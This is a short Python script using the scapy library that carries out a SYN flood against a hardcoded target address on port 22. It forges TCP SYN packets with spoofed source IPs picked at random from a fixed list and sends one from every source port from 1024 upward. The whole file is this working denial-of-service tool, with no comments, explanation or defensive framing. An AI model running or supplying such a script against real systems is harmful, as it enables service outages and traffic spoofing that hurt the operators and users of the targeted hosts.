
import random
from scapy.all import *


def synFlood(dstip,dport):
    srcList = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']
    for src_port in range(1024,65535):
        syn_pkt = IP(src=random.choice(srcList),dst=dstip)/TCP(sport = int(src_port), dport=int(dport),flags='S')
        send(syn_pkt)

if __name__ == "__main__":
    synFlood('192.168.56.10',22)


